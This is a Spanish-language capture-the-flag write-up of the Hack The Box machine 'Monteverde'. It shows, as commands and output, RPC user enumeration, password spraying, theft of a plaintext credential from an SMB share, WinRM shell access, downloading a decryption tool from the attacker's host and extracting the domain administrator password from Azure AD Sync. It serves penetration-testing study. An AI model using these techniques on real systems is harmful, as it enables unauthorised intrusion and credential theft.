---
layout: post
title: Monteverde
date: 2023-03-07
description:
img:
fig-caption:
tags: [OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Monteverde-htb/Monteverde.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración por RPC

* Password Spraying

* Abuso del grupo Azure Admins (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.172 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 08:48 GMT
Nmap scan report for 10.10.10.172
Host is up (0.10s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49697/tcp open  unknown
64664/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 40.31 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49697,64664 10.10.10.172 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 08:50 GMT
Nmap scan report for 10.10.10.172
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-07 08:50:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
64664/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -2s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-07T08:51:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.77 seconds
```

Añado el dominio ```megabank.local``` al ```/etc/hosts```

## Puerto 135 (RPC)

Puedo extraer todos los usuarios del directorio activo

```null
rpcclient -U "" 10.10.10.172 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v "0x" | tr -d "[]" > users
```

Los valido por Kerberos

```null
kerbrute userenum -d megabank.local --dc 10.10.10.172 users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 03/07/23 - Ronnie Flathers @ropnop

2023/03/07 08:54:54 >  Using KDC(s):
2023/03/07 08:54:54 >  	10.10.10.172:88

2023/03/07 08:54:54 >  [+] VALID USERNAME:	AAD_987d7f2f57d2@megabank.local
2023/03/07 08:54:54 >  [+] VALID USERNAME:	svc-ata@megabank.local
2023/03/07 08:54:54 >  [+] VALID USERNAME:	SABatchJobs@megabank.local
2023/03/07 08:54:54 >  [+] VALID USERNAME:	svc-bexec@megabank.local
2023/03/07 08:54:54 >  [+] VALID USERNAME:	mhope@megabank.local
2023/03/07 08:54:54 >  [+] VALID USERNAME:	dgalanos@megabank.local
2023/03/07 08:54:54 >  [+] VALID USERNAME:	roleary@megabank.local
2023/03/07 08:54:54 >  [+] VALID USERNAME:	smorgan@megabank.local
2023/03/07 08:54:54 >  [+] VALID USERNAME:	svc-netapp@megabank.local
2023/03/07 08:54:54 >  Done! Tested 10 usernames (9 valid) in 0.191 seconds
```

Uno de ellos no es válido, y ninguno ASP-Roasteable. Aplico un Password Spraying, y una contraseña tomando como diccionario el nombre de usuarios es válida

```null
crackmapexec smb 10.10.10.172 -u users -p users --continue-on-success | grep "+"
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
```

Aunque no lo es por WiRNM

```null
rackmapexec winrm 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs'
SMB         10.10.10.172    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
HTTP        10.10.10.172    5985   MONTEVERDE       [*] http://10.10.10.172:5985/wsman
WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

## Puerto 445 (SMB)

Con crackmapexec, aplico un escaneo para ver dominio, hostname y versiones

```null
crackmapexec smb 10.10.10.172
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```

No puedo listar los recursos compartidos haciendo uso de un null session

```null
smbmap -H 10.10.10.172 -u 'null'
[!] Authentication error on 10.10.10.172
```

Pero ya tengo credenciales

```null
smbmap -H 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs'
                                                                                                    
[+] IP: 10.10.10.172:445	Name: megabank.local      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	azure_uploads                                     	READ ONLY	
	C$                                                	NO ACCESS	Default share
	E$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	users$                                            	READ ONLY	
```

Dentro de ```users$```, en el directorio personal de ```mhope```, hay un archivo ```azure.xml```

```null
impacket-smbclient megabank.local/SABatchJobs:SABatchJobs@10.10.10.172
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
azure_uploads
C$
E$
IPC$
NETLOGON
SYSVOL
users$
# use users$
# ls
drw-rw-rw-          0  Fri Jan  3 13:12:48 2020 .
drw-rw-rw-          0  Fri Jan  3 13:12:48 2020 ..
drw-rw-rw-          0  Fri Jan  3 13:15:23 2020 dgalanos
drw-rw-rw-          0  Fri Jan  3 13:41:18 2020 mhope
drw-rw-rw-          0  Fri Jan  3 13:14:56 2020 roleary
drw-rw-rw-          0  Fri Jan  3 13:14:28 2020 smorgan
# cd mhope
# ls
drw-rw-rw-          0  Fri Jan  3 13:41:18 2020 .
drw-rw-rw-          0  Fri Jan  3 13:41:18 2020 ..
-rw-rw-rw-       1212  Fri Jan  3 14:59:24 2020 azure.xml
# get azure.xml
```

Contiene una credencial en texto claro

```null
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

Corresponde a la del usuario ```mhope```

```null
crackmapexec smb 10.10.10.172 -u users -p '4n0therD4y@n0th3r$' --continue-on-success | grep "+"
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
```

Es válida por ```WINRM```, por lo que puedo ganar acceso al sistema

```null
crackmapexec winrm 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'
SMB         10.10.10.172    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
HTTP        10.10.10.172    5985   MONTEVERDE       [*] http://10.10.10.172:5985/wsman
WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```

```null
evil-winrm -i 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> 
```

Puedo ver la primera flag

```null
*Evil-WinRM* PS C:\Users\mhope\Desktop> type user.txt
6eb32df9ae8dd1a3f00e3ffd6e795da6
```

# Escalada

Pertenezco al grupo ```Azure Admins```

```null
*Evil-WinRM* PS C:\Users\mhope\Desktop> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 3:40:05 PM
Password expires             Never
Password changeable          1/3/2020 3:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   3/7/2023 1:08:12 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```

En caso de pertenecer a este, es posible llegar a obtener la credencial de cualquier usuario. Para ello utilizo el repositoiro [AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt)

```null
*Evil-WinRM* PS C:\Temp> iwr -uri http://10.10.16.9/AdDecrypt.exe -o AdDecrypt.exe
*Evil-WinRM* PS C:\Temp> iwr -uri http://10.10.16.9/mcrypt.dll -o mcrypt.dll
*Evil-WinRM* PS C:\> cd "C:\Program Files\Microsoft Azure AD Sync\bin"
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\bin> C:\Temp\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL

Puedo ver la segunda flag

```null
evil-winrm -i 10.10.10.172 -u 'Administrator' -p 'd0m@in4dminyeah!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
126312d9b20d47e4fe18c54d3aedff1b
```